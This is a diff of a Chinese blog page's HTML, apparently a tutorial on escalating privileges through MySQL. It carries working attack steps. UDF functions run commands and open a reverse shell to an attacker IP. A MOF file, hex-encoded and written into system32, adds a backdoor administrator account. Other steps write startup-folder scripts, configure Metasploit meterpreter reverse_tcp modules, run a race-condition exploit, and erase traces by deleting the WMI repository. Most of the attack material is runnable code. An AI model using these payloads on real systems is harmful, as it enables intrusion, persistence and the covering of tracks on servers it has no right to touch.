+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">SELECT</span><span class="w"> </span><span class="n">hex</span><span class="p">(</span><span class="n">load_file</span><span class="p">(</span><span class="s1">&#39;/lib_mysqludf_sys_64.so&#39;</span><span class="p">));</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">#</span><span class="w"> </span><span class="err">也可以将路径</span><span class="w"> </span><span class="n">hex</span><span class="w"> </span><span class="err">编码</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">SELECT</span><span class="w"> </span><span class="n">hex</span><span class="p">(</span><span class="n">load_file</span><span class="p">(</span><span class="mi">0</span><span class="n">x2f6c69625f6d7973716c7564665f7379735f36342e736f</span><span class="p">));</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
 </div>
 </div><h4 id="214-命令执行">2.1.4 命令执行</h4>
 <div class="highlight"><div class="chroma">
@@ -537,9 +537,9 @@ msf6 &gt; use exploit/linux/mysql/mysql_yassl_hello
 </span><span class="lnt">2
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="k">CREATE</span><span class="w"> </span><span class="k">FUNCTION</span><span class="w"> </span><span class="n">sys_eval</span><span class="w"> </span><span class="k">RETURNS</span><span class="w"> </span><span class="n">STRING</span><span class="w"> </span><span class="n">SONAME</span><span class="w"> </span><span class="s1">&#39;udf.dll&#39;</span><span class="p">;</span><span class="w">
-</span><span class="w"></span><span class="k">select</span><span class="w"> </span><span class="n">sys_eval</span><span class="p">(</span><span class="s1">&#39;whoami&#39;</span><span class="p">);</span><span class="w">
-</span></code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">CREATE</span><span class="w"> </span><span class="k">FUNCTION</span><span class="w"> </span><span class="n">sys_eval</span><span class="w"> </span><span class="k">RETURNS</span><span class="w"> </span><span class="n">STRING</span><span class="w"> </span><span class="n">SONAME</span><span class="w"> </span><span class="s1">&#39;udf.dll&#39;</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">select</span><span class="w"> </span><span class="n">sys_eval</span><span class="p">(</span><span class="s1">&#39;whoami&#39;</span><span class="p">);</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
 </div>
 </div><h4 id="215-清理痕迹">2.1.5 清理痕迹</h4>
 <p>删除自定义函数：</p>
@@ -548,8 +548,8 @@ msf6 &gt; use exploit/linux/mysql/mysql_yassl_hello
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="k">drop</span><span class="w"> </span><span class="k">function</span><span class="w"> </span><span class="n">sys_eval</span><span class="p">;</span><span class="w">
-</span></code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">drop</span><span class="w"> </span><span class="k">function</span><span class="w"> </span><span class="n">sys_eval</span><span class="p">;</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
 </div>
 </div><h3 id="22-自动化实现">2.2 自动化实现</h3>
 <p>msf 中的模块：</p>
@@ -558,8 +558,8 @@ msf6 &gt; use exploit/linux/mysql/mysql_yassl_hello
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">msf6 &gt; <span class="nb">set</span> payload linux/x86/shell/bind_tcp
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">msf6 &gt; <span class="nb">set</span> payload linux/x86/shell/bind_tcp
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h3 id="23-udf-shell">2.3 UDF Shell</h3>
 <p>假设目标 MySQL 在内网情况下，无法直连 MySQL 或者 MySQL 不允许外连，这个时候一些网页脚本就比较方便好用了。</p>
@@ -609,17 +609,17 @@ msf6 &gt; use exploit/linux/mysql/mysql_yassl_hello
 </span><span class="lnt">10
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">cmdshell        <span class="c1"># 执行cmd</span>
-downloader      <span class="c1"># 下载者,到网上下载指定文件并保存到指定目录</span>
-open3389        <span class="c1"># 通用开3389终端服务,可指定端口(不改端口无需重启)</span>
-backshell       <span class="c1"># 反弹Shell</span>
-ProcessView     <span class="c1"># 枚举系统进程</span>
-KillProcess     <span class="c1"># 终止指定进程</span>
-regread         <span class="c1"># 读注册表</span>
-regwrite        <span class="c1"># 写注册表</span>
-shut            <span class="c1"># 关机,注销,重启</span>
-about           <span class="c1"># 说明与帮助函数</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">cmdshell        <span class="c1"># 执行cmd</span>
+</span></span><span class="line"><span class="cl">downloader      <span class="c1"># 下载者,到网上下载指定文件并保存到指定目录</span>
+</span></span><span class="line"><span class="cl">open3389        <span class="c1"># 通用开3389终端服务,可指定端口(不改端口无需重启)</span>
+</span></span><span class="line"><span class="cl">backshell       <span class="c1"># 反弹Shell</span>
+</span></span><span class="line"><span class="cl">ProcessView     <span class="c1"># 枚举系统进程</span>
+</span></span><span class="line"><span class="cl">KillProcess     <span class="c1"># 终止指定进程</span>
+</span></span><span class="line"><span class="cl">regread         <span class="c1"># 读注册表</span>
+</span></span><span class="line"><span class="cl">regwrite        <span class="c1"># 写注册表</span>
+</span></span><span class="line"><span class="cl">shut            <span class="c1"># 关机,注销,重启</span>
+</span></span><span class="line"><span class="cl">about           <span class="c1"># 说明与帮助函数</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>地址：<a href="https://github.com/Geekby/langouster_udf" target="_blank" rel="noopener noreffer">https://github.com/Geekby/langouster_udf</a></p>
 <p>首先在攻击机上开启 NC 监听，然后目标机器上导入 dll 动态链接库，然后创建自定义函数：</p>
@@ -628,8 +628,8 @@ about           <span class="c1"># 说明与帮助函数</span>
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="k">CREATE</span><span class="w"> </span><span class="k">FUNCTION</span><span class="w"> </span><span class="n">backshell</span><span class="w"> </span><span class="k">RETURNS</span><span class="w"> </span><span class="n">STRING</span><span class="w"> </span><span class="n">SONAME</span><span class="w"> </span><span class="s1">&#39;udf.dll&#39;</span><span class="p">;</span><span class="w">
-</span></code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">CREATE</span><span class="w"> </span><span class="k">FUNCTION</span><span class="w"> </span><span class="n">backshell</span><span class="w"> </span><span class="k">RETURNS</span><span class="w"> </span><span class="n">STRING</span><span class="w"> </span><span class="n">SONAME</span><span class="w"> </span><span class="s1">&#39;udf.dll&#39;</span><span class="p">;</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
 </div>
 </div><p>直接反弹 shell ：</p>
 <div class="highlight"><div class="chroma">
@@ -637,8 +637,8 @@ about           <span class="c1"># 说明与帮助函数</span>
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="k">select</span><span class="w"> </span><span class="n">backshell</span><span class="p">(</span><span class="s2">&#34;IP&#34;</span><span class="p">,</span><span class="w"> </span><span class="mi">4444</span><span class="p">);</span><span class="w">
-</span></code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">select</span><span class="w"> </span><span class="n">backshell</span><span class="p">(</span><span class="s2">&#34;IP&#34;</span><span class="p">,</span><span class="w"> </span><span class="mi">4444</span><span class="p">);</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
 </div>
 </div><h2 id="3-mof-提权">3 MOF 提权</h2>
 <p>MOF 提权是一个有历史的漏洞，基本上在 Windows Server 2003 的环境下才可以成功。</p>
@@ -675,32 +675,32 @@ about           <span class="c1"># 说明与帮助函数</span>
 </span><span class="lnt">25
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">#pragma namespace(&#34;\\\\.\\root\\subscription&#34;) 
-
-instance of __EventFilter as $EventFilter 
-{ 
-    EventNamespace = &#34;Root\\Cimv2&#34;; 
-    Name  = &#34;filtP2&#34;; 
-    Query = &#34;Select * From __InstanceModificationEvent &#34; 
-            &#34;Where TargetInstance Isa \&#34;Win32_LocalTime\&#34; &#34; 
-            &#34;And TargetInstance.Second = 5&#34;; 
-    QueryLanguage = &#34;WQL&#34;; 
-}; 
-
-instance of ActiveScriptEventConsumer as $Consumer 
-{ 
-    Name = &#34;consPCSV2&#34;; 
-    ScriptingEngine = &#34;JScript&#34;; 
-    ScriptText = 
-&#34;var WSH = new ActiveXObject(\&#34;WScript.Shell\&#34;)\nWSH.run(\&#34;net.exe user hacker P@ssw0rd /add\&#34;)\nWSH.run(\&#34;net.exe localgroup administrators hacker /add\&#34;)&#34;; 
-}; 
-
-instance of __FilterToConsumerBinding 
-{ 
-    Consumer   = $Consumer; 
-    Filter = $EventFilter; 
-};
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">#pragma namespace(&#34;\\\\.\\root\\subscription&#34;) 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">instance of __EventFilter as $EventFilter 
+</span></span><span class="line"><span class="cl">{ 
+</span></span><span class="line"><span class="cl">    EventNamespace = &#34;Root\\Cimv2&#34;; 
+</span></span><span class="line"><span class="cl">    Name  = &#34;filtP2&#34;; 
+</span></span><span class="line"><span class="cl">    Query = &#34;Select * From __InstanceModificationEvent &#34; 
+</span></span><span class="line"><span class="cl">            &#34;Where TargetInstance Isa \&#34;Win32_LocalTime\&#34; &#34; 
+</span></span><span class="line"><span class="cl">            &#34;And TargetInstance.Second = 5&#34;; 
+</span></span><span class="line"><span class="cl">    QueryLanguage = &#34;WQL&#34;; 
+</span></span><span class="line"><span class="cl">}; 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">instance of ActiveScriptEventConsumer as $Consumer 
+</span></span><span class="line"><span class="cl">{ 
+</span></span><span class="line"><span class="cl">    Name = &#34;consPCSV2&#34;; 
+</span></span><span class="line"><span class="cl">    ScriptingEngine = &#34;JScript&#34;; 
+</span></span><span class="line"><span class="cl">    ScriptText = 
+</span></span><span class="line"><span class="cl">&#34;var WSH = new ActiveXObject(\&#34;WScript.Shell\&#34;)\nWSH.run(\&#34;net.exe user hacker P@ssw0rd /add\&#34;)\nWSH.run(\&#34;net.exe localgroup administrators hacker /add\&#34;)&#34;; 
+</span></span><span class="line"><span class="cl">}; 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">instance of __FilterToConsumerBinding 
+</span></span><span class="line"><span class="cl">{ 
+</span></span><span class="line"><span class="cl">    Consumer   = $Consumer; 
+</span></span><span class="line"><span class="cl">    Filter = $EventFilter; 
+</span></span><span class="line"><span class="cl">};
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>利用 MySQL 写文件的特性将这个 MOF 文件导入到 <code>C:/Windows/system32/wbem/mof/</code> 目录下，依然采用上述编码的方式：</p>
 <div class="highlight"><div class="chroma">
@@ -708,8 +708,8 @@ instance of __FilterToConsumerBinding
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="k">select</span><span class="w"> </span><span class="mi">0</span><span class="n">x23707261676D61206E616D65737061636528225C5C5C5C2E5C5C726F6F745C5C737562736372697074696F6E2229200A0A696E7374616E6365206F66205F5F4576656E7446696C74657220617320244576656E7446696C746572200A7B200A202020204576656E744E616D657370616365203D2022526F6F745C5C43696D7632223B200A202020204E616D6520203D202266696C745032223B200A202020205175657279203D202253656C656374202A2046726F6D205F5F496E7374616E63654D6F64696669636174696F6E4576656E742022200A20202020202020202020202022576865726520546172676574496E7374616E636520497361205C2257696E33325F4C6F63616C54696D655C222022200A20202020202020202020202022416E6420546172676574496E7374616E63652E5365636F6E64203D2035223B200A2020202051756572794C616E6775616765203D202257514C223B200A7D3B200A0A696E7374616E6365206F66204163746976655363726970744576656E74436F6E73756D65722061732024436F6E73756D6572200A7B200A202020204E616D65203D2022636F6E735043535632223B200A20202020536372697074696E67456E67696E65203D20224A536372697074223B200A2020202053637269707454657874203D200A2276617220575348203D206E657720416374697665584F626A656374285C22575363726970742E5368656C6C5C22295C6E5753482E72756E285C226E65742E6578652075736572206861636B6572205040737377307264202F6164645C22295C6E5753482E72756E285C226E65742E657865206C6F63616C67726F75702061646D696E6973747261746F7273206861636B6572202F6164645C2229223B200A7D3B200A0A696E7374616E6365206F66205F5F46696C746572546F436F6E73756D657242696E64696E67200A7B200A20202020436F6E73756D65722020203D2024436F6E73756D65723B200A2020202046696C746572203D20244576656E7446696C7465723B200A7D3B0A</span><span class="w"> </span><span class="k">into</span><span class="w"> </span><span class="n">dumpfile</span><span class="w"> </span><span class="s2">&#34;C:/windows/system32/wbem/mof/test.mof&#34;</span><span class="p">;</span><span class="w">
-</span></code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">select</span><span class="w"> </span><span class="mi">0</span><span class="n">x23707261676D61206E616D65737061636528225C5C5C5C2E5C5C726F6F745C5C737562736372697074696F6E2229200A0A696E7374616E6365206F66205F5F4576656E7446696C74657220617320244576656E7446696C746572200A7B200A202020204576656E744E616D657370616365203D2022526F6F745C5C43696D7632223B200A202020204E616D6520203D202266696C745032223B200A202020205175657279203D202253656C656374202A2046726F6D205F5F496E7374616E63654D6F64696669636174696F6E4576656E742022200A20202020202020202020202022576865726520546172676574496E7374616E636520497361205C2257696E33325F4C6F63616C54696D655C222022200A20202020202020202020202022416E6420546172676574496E7374616E63652E5365636F6E64203D2035223B200A2020202051756572794C616E6775616765203D202257514C223B200A7D3B200A0A696E7374616E6365206F66204163746976655363726970744576656E74436F6E73756D65722061732024436F6E73756D6572200A7B200A202020204E616D65203D2022636F6E735043535632223B200A20202020536372697074696E67456E67696E65203D20224A536372697074223B200A2020202053637269707454657874203D200A2276617220575348203D206E657720416374697665584F626A656374285C22575363726970742E5368656C6C5C22295C6E5753482E72756E285C226E65742E6578652075736572206861636B6572205040737377307264202F6164645C22295C6E5753482E72756E285C226E65742E657865206C6F63616C67726F75702061646D696E6973747261746F7273206861636B6572202F6164645C2229223B200A7D3B200A0A696E7374616E6365206F66205F5F46696C746572546F436F6E73756D657242696E64696E67200A7B200A20202020436F6E73756D65722020203D2024436F6E73756D65723B200A2020202046696C746572203D20244576656E7446696C7465723B200A7D3B0A</span><span class="w"> </span><span class="k">into</span><span class="w"> </span><span class="n">dumpfile</span><span class="w"> </span><span class="s2">&#34;C:/windows/system32/wbem/mof/test.mof&#34;</span><span class="p">;</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
 </div>
 </div><h4 id="322-痕迹清理">3.2.2 痕迹清理</h4>
 <p>因为每隔几分钟时间又会重新执行添加用户的命令，所以想要清理痕迹得先暂时关闭 winmgmt 服务再删除相关 mof 文件，这个时候再删除用户才会有效果：</p>
@@ -731,21 +731,21 @@ instance of __FilterToConsumerBinding
 </span><span class="lnt">14
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="c1"># 停止 winmgmt 服务</span>
-net stop winmgmt
-
-<span class="c1"># 删除 Repository 文件夹</span>
-rmdir /s /q C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32<span class="se">\w</span>bem<span class="se">\R</span>epository<span class="se">\
-</span><span class="se"></span>
-<span class="c1"># 手动删除 mof 文件</span>
-del C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32<span class="se">\w</span>bem<span class="se">\m</span>of<span class="se">\g</span>ood<span class="se">\t</span>est.mof /F /S
-
-<span class="c1"># 删除创建的用户</span>
-net user hacker /delete
-
-<span class="c1"># 重新启动服务</span>
-net start winmgmt
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># 停止 winmgmt 服务</span>
+</span></span><span class="line"><span class="cl">net stop winmgmt
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 删除 Repository 文件夹</span>
+</span></span><span class="line"><span class="cl">rmdir /s /q C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32<span class="se">\w</span>bem<span class="se">\R</span>epository<span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 手动删除 mof 文件</span>
+</span></span><span class="line"><span class="cl">del C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32<span class="se">\w</span>bem<span class="se">\m</span>of<span class="se">\g</span>ood<span class="se">\t</span>est.mof /F /S
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 删除创建的用户</span>
+</span></span><span class="line"><span class="cl">net user hacker /delete
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 重新启动服务</span>
+</span></span><span class="line"><span class="cl">net start winmgmt
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h3 id="33-自动化实现">3.3 自动化实现</h3>
 <p>MSF 里面自带了 MOF 提权模块：</p>
@@ -762,16 +762,16 @@ net start winmgmt
 </span><span class="lnt">9
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">msf6 &gt; use exploit/windows/mysql/mysql_mof
-<span class="c1"># 设置好自己的 payload</span>
-msf6 &gt; <span class="nb">set</span> payload windows/meterpreter/reverse_tcp
-
-<span class="c1"># 设置目标 MySQL 的基础信息</span>
-msf6 &gt; <span class="nb">set</span> rhosts 192.168.102.1
-msf6 &gt; <span class="nb">set</span> username root
-msf6 &gt; <span class="nb">set</span> password root
-msf6 &gt; run
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">msf6 &gt; use exploit/windows/mysql/mysql_mof
+</span></span><span class="line"><span class="cl"><span class="c1"># 设置好自己的 payload</span>
+</span></span><span class="line"><span class="cl">msf6 &gt; <span class="nb">set</span> payload windows/meterpreter/reverse_tcp
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 设置目标 MySQL 的基础信息</span>
+</span></span><span class="line"><span class="cl">msf6 &gt; <span class="nb">set</span> rhosts 192.168.102.1
+</span></span><span class="line"><span class="cl">msf6 &gt; <span class="nb">set</span> username root
+</span></span><span class="line"><span class="cl">msf6 &gt; <span class="nb">set</span> password root
+</span></span><span class="line"><span class="cl">msf6 &gt; run
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h2 id="4-启动项提权">4 启动项提权</h2>
 <p>这种提权也常见于 Windows 环境下，当 Windows 的启动项可以被 MySQL 写入的时候可以使用 MySQL 将自定义脚本导入到启动项中，这个脚本会在用户登录、开机、关机的时候自动运行。</p>
@@ -794,18 +794,18 @@ msf6 &gt; run
 </span><span class="lnt">11
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="c1"># 中文系统</span>
-C:<span class="se">\D</span>ocuments and Settings<span class="se">\A</span>dministrator<span class="se">\「</span>开始」菜单<span class="se">\程</span>序<span class="se">\启</span>动
-C:<span class="se">\D</span>ocuments and Settings<span class="se">\A</span>ll Users<span class="se">\「</span>开始」菜单<span class="se">\程</span>序<span class="se">\启</span>动
-
-<span class="c1"># 英文系统</span>
-C:<span class="se">\D</span>ocuments and Settings<span class="se">\A</span>dministrator<span class="se">\S</span>tart Menu<span class="se">\P</span>rograms<span class="se">\S</span>tartup
-C:<span class="se">\D</span>ocuments and Settings<span class="se">\A</span>ll Users<span class="se">\S</span>tart Menu<span class="se">\P</span>rograms<span class="se">\S</span>tartup
-
-<span class="c1"># 开关机项 需要自己建立对应文件夹</span>
-C:<span class="se">\W</span>INDOWS<span class="se">\s</span>ystem32<span class="se">\G</span>roupPolicy<span class="se">\M</span>achine<span class="se">\S</span>cripts<span class="se">\S</span>tartup
-C:<span class="se">\W</span>INDOWS<span class="se">\s</span>ystem32<span class="se">\G</span>roupPolicy<span class="se">\M</span>achine<span class="se">\S</span>cripts<span class="se">\S</span>hutdown
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># 中文系统</span>
+</span></span><span class="line"><span class="cl">C:<span class="se">\D</span>ocuments and Settings<span class="se">\A</span>dministrator<span class="se">\「</span>开始」菜单<span class="se">\程</span>序<span class="se">\启</span>动
+</span></span><span class="line"><span class="cl">C:<span class="se">\D</span>ocuments and Settings<span class="se">\A</span>ll Users<span class="se">\「</span>开始」菜单<span class="se">\程</span>序<span class="se">\启</span>动
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 英文系统</span>
+</span></span><span class="line"><span class="cl">C:<span class="se">\D</span>ocuments and Settings<span class="se">\A</span>dministrator<span class="se">\S</span>tart Menu<span class="se">\P</span>rograms<span class="se">\S</span>tartup
+</span></span><span class="line"><span class="cl">C:<span class="se">\D</span>ocuments and Settings<span class="se">\A</span>ll Users<span class="se">\S</span>tart Menu<span class="se">\P</span>rograms<span class="se">\S</span>tartup
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 开关机项 需要自己建立对应文件夹</span>
+</span></span><span class="line"><span class="cl">C:<span class="se">\W</span>INDOWS<span class="se">\s</span>ystem32<span class="se">\G</span>roupPolicy<span class="se">\M</span>achine<span class="se">\S</span>cripts<span class="se">\S</span>tartup
+</span></span><span class="line"><span class="cl">C:<span class="se">\W</span>INDOWS<span class="se">\s</span>ystem32<span class="se">\G</span>roupPolicy<span class="se">\M</span>achine<span class="se">\S</span>cripts<span class="se">\S</span>hutdown
+</span></span></code></pre></td></tr></table>
 </div>
 </div><ul>
 <li><strong>Windows Server 2008</strong> 的启动项路径：</li>
@@ -816,9 +816,9 @@ C:<span class="se">\W</span>INDOWS<span class="se">\s</span>ystem32<span class="
 </span><span class="lnt">2
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\A</span>ppData<span class="se">\R</span>oaming<span class="se">\M</span>icrosoft<span class="se">\W</span>indows<span class="se">\S</span>tart Menu<span class="se">\P</span>rograms<span class="se">\S</span>tartup
-C:<span class="se">\P</span>rogramData<span class="se">\M</span>icrosoft<span class="se">\W</span>indows<span class="se">\S</span>tart Menu<span class="se">\P</span>rograms<span class="se">\S</span>tartup
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\A</span>ppData<span class="se">\R</span>oaming<span class="se">\M</span>icrosoft<span class="se">\W</span>indows<span class="se">\S</span>tart Menu<span class="se">\P</span>rograms<span class="se">\S</span>tartup
+</span></span><span class="line"><span class="cl">C:<span class="se">\P</span>rogramData<span class="se">\M</span>icrosoft<span class="se">\W</span>indows<span class="se">\S</span>tart Menu<span class="se">\P</span>rograms<span class="se">\S</span>tartup
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h3 id="42-写入文件">4.2 写入文件</h3>
 <div class="highlight"><div class="chroma">
@@ -826,8 +826,8 @@ C:<span class="se">\P</span>rogramData<span class="se">\M</span>icrosoft<span cl
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="k">select</span><span class="w"> </span><span class="mi">0</span><span class="n">x</span><span class="p">...</span><span class="w"> </span><span class="k">into</span><span class="w"> </span><span class="n">dumpfile</span><span class="w"> </span><span class="s2">&#34;C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\test.vbs&#34;</span><span class="p">;</span><span class="w">
-</span></code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">select</span><span class="w"> </span><span class="mi">0</span><span class="n">x</span><span class="p">...</span><span class="w"> </span><span class="k">into</span><span class="w"> </span><span class="n">dumpfile</span><span class="w"> </span><span class="s2">&#34;C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\test.vbs&#34;</span><span class="p">;</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
 </div>
 </div><p>写入成功的时候就等待系统用户重新登录，登录成功的话，我们的自定义脚本也就会被执行。</p>
 <h3 id="42-msf-自动化实现">4.2 MSF 自动化实现</h3>
@@ -836,8 +836,8 @@ C:<span class="se">\P</span>rogramData<span class="se">\M</span>icrosoft<span cl
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">msf6 &gt; use exploit/windows/mysql/mysql_start_up
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">msf6 &gt; use exploit/windows/mysql/mysql_start_up
+</span></span></code></pre></td></tr></table>
 </div>
 </div><div class="details admonition info open">
         <div class="details-summary admonition-title">
@@ -873,8 +873,8 @@ C:<span class="se">\P</span>rogramData<span class="se">\M</span>icrosoft<span cl
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">gcc mysql-privesc-race.c -o mysql-privesc-race -I/usr/include/mysql -lmysqlclient
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">gcc mysql-privesc-race.c -o mysql-privesc-race -I/usr/include/mysql -lmysqlclient
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>执行 EXP 提权：</p>
 <div class="highlight"><div class="chroma">
@@ -883,9 +883,9 @@ C:<span class="se">\P</span>rogramData<span class="se">\M</span>icrosoft<span cl
 </span><span class="lnt">2
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="c1"># ./mysql-privesc-race 数据库用户名 密码 数据库地址 数据库</span>
-./mysql-privesc-race <span class="nb">test</span> <span class="m">123456</span> localhost <span class="nb">test</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># ./mysql-privesc-race 数据库用户名 密码 数据库地址 数据库</span>
+</span></span><span class="line"><span class="cl">./mysql-privesc-race <span class="nb">test</span> <span class="m">123456</span> localhost <span class="nb">test</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>参考：</p>
 <ul>
@@ -930,7 +930,7 @@ C:<span class="se">\P</span>rogramData<span class="se">\M</span>icrosoft<span cl
 </div>
 </article></div>
             </main><footer class="footer">
-        <div class="footer-container"><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2019 - 2021</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">Geekby</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        <div class="footer-container"><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2019 - 2022</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">Geekby</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
         </div>
     </footer></div>
 
